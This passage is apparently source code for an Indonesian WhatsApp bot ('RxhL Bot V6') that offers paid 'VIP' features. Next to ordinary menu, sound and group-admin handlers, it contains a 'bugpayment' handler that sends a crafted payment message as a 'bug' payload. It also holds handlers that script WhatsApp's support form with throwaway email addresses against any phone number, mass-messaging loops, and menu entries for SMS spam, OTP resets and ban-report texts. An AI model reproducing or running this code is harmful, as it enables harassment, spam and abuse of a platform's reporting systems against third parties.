                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`Text Banned One Report\`
┃
┃⭔ ${prefix}txtban1
┃⭔ ${prefix}txtban2
┃⭔ ${prefix}txtban3
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// AKSES MENU
case 'aksesmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Akses\` 
┃
┃⭔ ${prefix}addowner 62xxx
┃⭔ ${prefix}dellowner 62xxx
┃⭔ ${prefix}addmurbug 62xxx
┃⭔ ${prefix}dellmurbug 62xxx
┃⭔ ${prefix}listuser
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// SOUND MENU
case 'soundmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Sound\` 
┃
┃⭔ ${prefix}sound1
┃⭔ ${prefix}sound2
┃⭔ ${prefix}sound3
┃⭔ ${prefix}sound4
┃⭔ ${prefix}sound5
┃⭔ ${prefix}sound6
┃⭔ ${prefix}sound7
┃⭔ ${prefix}sound8
┃⭔ ${prefix}sound9
┃⭔ ${prefix}sound10
┃⭔ ${prefix}sound11
┃⭔ ${prefix}sound12
┃⭔ ${prefix}sound13
┃⭔ ${prefix}sound14
┃⭔ ${prefix}sound15
┃⭔ ${prefix}sound16
┃⭔ ${prefix}sound17
┃⭔ ${prefix}sound18
┃⭔ ${prefix}sound18
┃⭔ ${prefix}sound20
┃⭔ ${prefix}sound21
┃⭔ ${prefix}sound22
┃⭔ ${prefix}sound23
┃⭔ ${prefix}sound24
┃⭔ ${prefix}sound25
┃⭔ ${prefix}sound26
┃⭔ ${prefix}sound27
┃⭔ ${prefix}sound28
┃⭔ ${prefix}sound29
┃⭔ ${prefix}sound30
┃⭔ ${prefix}sound31
┃⭔ ${prefix}sound32
┃⭔ ${prefix}sound33
┃⭔ ${prefix}sound34
┃⭔ ${prefix}sound35
┃⭔ ${prefix}sound36
┃⭔ ${prefix}sound37
┃⭔ ${prefix}sound38
┃⭔ ${prefix}sound39
┃⭔ ${prefix}sound40
┃⭔ ${prefix}sound41
┃⭔ ${prefix}sound42
┃⭔ ${prefix}sound43
┃⭔ ${prefix}sound44
┃⭔ ${prefix}sound45
┃⭔ ${prefix}sound46
┃⭔ ${prefix}sound47
┃⭔ ${prefix}sound48
┃⭔ ${prefix}sound49
┃⭔ ${prefix}sound50
┃⭔ ${prefix}sound51
┃⭔ ${prefix}sound52
┃⭔ ${prefix}sound53
┃⭔ ${prefix}sound54
┃⭔ ${prefix}sound55
┃⭔ ${prefix}sound56
┃⭔ ${prefix}sound57
┃⭔ ${prefix}sound58
┃⭔ ${prefix}sound59
┃⭔ ${prefix}sound60
┃⭔ ${prefix}sound61
┃⭔ ${prefix}sound62
┃⭔ ${prefix}sound63
┃⭔ ${prefix}sound64
┃⭔ ${prefix}sound65
┃⭔ ${prefix}sound66
┃⭔ ${prefix}sound67
┃⭔ ${prefix}sound68
┃⭔ ${prefix}sound69
┃⭔ ${prefix}sound70
┃⭔ ${prefix}sound71
┃⭔ ${prefix}sound72
┃⭔ ${prefix}sound73
┃⭔ ${prefix}sound74
┃⭔ ${prefix}sound75
┃⭔ ${prefix}sound76
┃⭔ ${prefix}sound77
┃⭔ ${prefix}sound78
┃⭔ ${prefix}sound79
┃⭔ ${prefix}sound80
┃⭔ ${prefix}sound81
┃⭔ ${prefix}sound82
┃⭔ ${prefix}sound83
┃⭔ ${prefix}sound84
┃⭔ ${prefix}sound85
┃⭔ ${prefix}sound86
┃⭔ ${prefix}sound87
┃⭔ ${prefix}sound88
┃⭔ ${prefix}sound89
┃⭔ ${prefix}sound90
┃⭔ ${prefix}sound91
┃⭔ ${prefix}sound92
┃⭔ ${prefix}sound93
┃⭔ ${prefix}sound94
┃⭔ ${prefix}sound95
┃⭔ ${prefix}sound96
┃⭔ ${prefix}sound97
┃⭔ ${prefix}sound98
┃⭔ ${prefix}sound99
┃⭔ ${prefix}sound100
┃⭔ ${prefix}sound101
┃⭔ ${prefix}sound102
┃⭔ ${prefix}sound103
┃⭔ ${prefix}sound104
┃⭔ ${prefix}sound105
┃⭔ ${prefix}sound106
┃⭔ ${prefix}sound107
┃⭔ ${prefix}sound108
┃⭔ ${prefix}sound109
┃⭔ ${prefix}sound110
┃⭔ ${prefix}sound111
┃⭔ ${prefix}sound112
┃⭔ ${prefix}sound113
┃⭔ ${prefix}sound114
┃⭔ ${prefix}sound115
┃⭔ ${prefix}sound116
┃⭔ ${prefix}sound117
┃⭔ ${prefix}sound118
┃⭔ ${prefix}sound119
┃⭔ ${prefix}sound120
┃⭔ ${prefix}sound121
┃⭔ ${prefix}sound122
┃⭔ ${prefix}sound123
┃⭔ ${prefix}sound124
┃⭔ ${prefix}sound125
┃⭔ ${prefix}sound126
┃⭔ ${prefix}sound127
┃⭔ ${prefix}sound128
┃⭔ ${prefix}sound129
┃⭔ ${prefix}sound130
┃⭔ ${prefix}sound131
┃⭔ ${prefix}sound132
┃⭔ ${prefix}sound133
┃⭔ ${prefix}sound134
┃⭔ ${prefix}sound135
┃⭔ ${prefix}sound136
┃⭔ ${prefix}sound137
┃⭔ ${prefix}sound138
┃⭔ ${prefix}sound139
┃⭔ ${prefix}sound140
┃⭔ ${prefix}sound141
┃⭔ ${prefix}sound142
┃⭔ ${prefix}sound143
┃⭔ ${prefix}sound144
┃⭔ ${prefix}sound145
┃⭔ ${prefix}sound146
┃⭔ ${prefix}sound147
┃⭔ ${prefix}sound148
┃⭔ ${prefix}sound149
┃⭔ ${prefix}sound150
┃⭔ ${prefix}sound151
┃⭔ ${prefix}sound152
┃⭔ ${prefix}sound153
┃⭔ ${prefix}sound154
┃⭔ ${prefix}sound155
┃⭔ ${prefix}sound156
┃⭔ ${prefix}sound157
┃⭔ ${prefix}sound158
┃⭔ ${prefix}sound159
┃⭔ ${prefix}sound160
┃⭔ ${prefix}sound161
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// GROUP MENU
case 'groupmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Grup\` 
┃
┃⭔ ${prefix}pushkontak *text*
┃⭔ ${prefix}bcgroup *text*
┃⭔ ${prefix}hidetag *text*
┃⭔ ${prefix}editsubjek *text*
┃⭔ ${prefix}editdesk *text*
┃⭔ ${prefix}inspect *link gc*
┃⭔ ${prefix}add *62xxx*
┃⭔ ${prefix}kick *62xxx*
┃⭔ ${prefix}promote *62xxx*
┃⭔ ${prefix}demote *62xxx*
┃⭔ ${prefix}linkgroup
┃⭔ ${prefix}resetlinkgc
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// RXHL MENU
case 'rxhlmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur RxhL\` 
┃
┃⭔ ${prefix}resetotp *62xx*
┃⭔ ${prefix}unbanned *62xx*
┃⭔ ${prefix}unbannedv2 *62xx*
┃⭔ ${prefix}unbannedv3 *62xx*
┃⭔ ${prefix}spamsms *62xx*
┃⭔ ${prefix}nowa *62xx*
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// STICKER MENU
case 'stickermenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Sticker\` 
┃
┃⭔ ${prefix}attp *text*
┃⭔ ${prefix}sticker
┃⭔ ${prefix}smeme
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// DOWNLOAD MENU
case 'downloadmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Download\` 
┃
┃⭔ ${prefix}tiktokmp4 *link*
┃⭔ ${prefix}tiktokmp3 *link*
┃⭔ ${prefix}ytmp3 *link*
┃⭔ ${prefix}startytmp3 *judul*
┃⭔ ${prefix}yts *judul*
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// TOOLS MENU
case 'toolsmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Tools\` 
┃
┃⭔ ${prefix}style *teks*
┃⭔ ${prefix}fliptext *teks*
┃⭔ ${prefix}tourl *reply media*
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// ASUPAN MENU
case 'asupanmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Fitur Asupan\` 
┃
┃⭔ ${prefix}tiktokgirl 
┃⭔ ${prefix}tiktoknukthy 
┃⭔ ${prefix}tiktokkayes
┃⭔ ${prefix}tiktokpanrika
┃⭔ ${prefix}tiktoknotnot
┃⭔ ${prefix}tiktokghea
┃⭔ ${prefix}tiktoksantuy
┃⭔ ${prefix}paptt
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// CASE LAINNYA
case 'bugpayment':
if (!isMurbug) return replyz(global.nocreator)
var messa = await prepareWAMessageMedia({ image: rxhlimage }, { upload: rxhl.waUploadToServer })
var requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendeqtextMessage": {
"text": `𓁿 •RXHL OFFICIAL• 𓁿`,
}
}}), { userJid: from, quoted: m})
rxhl.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
break

case 'addowner':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return replyz(`Enter a valid number and register on WhatsApp!!!`)
owner.push(bnnd)
murbug.push(bnnd)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${bnnd} Has Been Added to Premium!!!`)
break

case 'dellowner':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(yaki)
anp = murbug.indexOf(yaki)
owner.splice(unp, 1)
murbug.splice(anp, 1)
fs.writeFileSync('./lib/owner.json', JSON.stringify(owner))
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${yaki} Has Been Removed From Premium!!!`)
break

case 'addmurbug':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
bnnd = qtext.split("|")[0].replace(/[^0-9]/g, '')
let cekkanbre = await rxhl.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekkanbre.length == 0) return replyz(`Enter a valid number and register on WhatsApp!!!`)
murbug.push(bnnd)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${bnnd} Has Been Added to Murbug!!!`)
break

case 'dellmurbug':
if (!isCreator) return replyz(global.nocreator)
if (!args[0]) return replyz(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
yaki = qtext.split("|")[0].replace(/[^0-9]/g, '')
unp = murbug.indexOf(yaki)
murbug.splice(unp, 1)
fs.writeFileSync('./lib/murbug.json', JSON.stringify(murbug))
replyz(`Number ${yaki} Has Been Removed From Murbug!!!`)
break

case 'listuser':
if (!isCreator) return replyz(global.nocreator)
teksooo = '*List User Vip*\n\n'
for (let i of owner) {
teksooo += `- ${i}\n`
}
teksooo += `\n*Total : ${owner.length}*`
rxhl.sendMessage(from, { text: teksooo.trim() }, 'extendeqtextMessage', { quoted:m, contextInfo: { "mentionedJid": owner } })
break

case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70': case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound76': case 'sound77': case 'sound78': case 'sound79': case 'sound80': case 'sound81': case 'sound82': case 'sound83': case 'sound84': case 'sound85': case 'sound86': case 'sound87': case 'sound88': case 'sound89': case 'sound90': case 'sound91': case 'sound92': case 'sound93': case 'sound94': case 'sound95': case 'sound96': case 'sound97': case 'sound98': case 'sound99': case 'sound100': case 'sound101': case 'sound102': case 'sound103': case 'sound104': case 'sound105': case 'sound106': case 'sound107': case 'sound108': case 'sound109': case 'sound110': case 'sound111': case 'sound112': case 'sound113': case 'sound114': case 'sound115': case 'sound116': case 'sound117': case 'sound118': case 'sound119': case 'sound120': case 'sound121': case 'sound122': case 'sound123': case 'sound124': case 'sound125': case 'sound126': case 'sound127': case 'sound128': case 'sound129': case 'sound130': case 'sound131': case 'sound132': case 'sound133': case 'sound134': case 'sound135': case 'sound136': case 'sound137': case 'sound138': case 'sound139': case 'sound140': case 'sound141': case 'sound142': case 'sound143': case 'sound144': case 'sound145': case 'sound146': case 'sound147': case 'sound148': case 'sound149': case 'sound150': case 'sound151': case 'sound152': case 'sound153': case 'sound154': case 'sound155': case 'sound156': case 'sound157': case 'sound158': case 'sound159': case 'sound160': case 'sound161':
await loading()
 rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await rxhl.sendMessage(from, { audio: rxhlganteng, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/50663646464',
title: `RXHL MODS`,
sourceUrl: `https://wa.me/50663646464`, 
thumbnail: rxhlimage
}
}})
break

case 'pushkontak':{
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!qtext) return replyz(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
replyz(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
for (let geek of mem) {
await sleep(5000)
rxhl.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
replyz(`*Successfully sent message To ${mem.length} person*`)
}
break

case 'bcgroup': {
if (!isCreator) return replyz(global.nocreator)
if (!qtext) return replyz(global.notext)
await loading()
let getGroups = await rxhl.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
replyz(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
for (let i of anu) {
await sleep(1500)
rxhl.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
replyz(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break

case 'hidetag': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
await loading()
rxhl.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

case 'kick': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'remove')
}
break

case 'add': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rxhl.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'editsubjek': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
if (!qtext) return replyz(global.notext)
await loading()
await rxhl.groupUpdateSubject(from, qtext)
}
break

case 'editdesk':{
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
if (!isAdmins) return replyz(global.usernoadmin)
if (!qtext) return replyz(global.notext)
await loading()
await rxhl.groupUpdateDescription(from, qtext)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
await loading()
let responsegg = await rxhl.groupInviteCode(from)
rxhl.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return replyz(global.nocreator)
if (!m.isGroup) return replyz(global.noingroup)
if (!isBotAdmins) return replyz(global.nobotadmin)
await loading()
rxhl.groupRevokeInvite(from)
break

case 'public': {
if (!isCreator) return replyz(global.nocreator)
rxhl.public = true
replyz('Sukse Change To Public')
}
break

case 'self': {
if (!isCreator) return replyz(global.nocreator)
rxhl.public = false
replyz('Sukse Change To Self')
}
break

case 'unbanned': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyz(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyz(util.format(res.data))
} catch (err) {replyz(`${err}`)}
} else replyz('Insert Number')
}
break

case 'unbannedv2': {
if (!isMurbug) return replyz(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
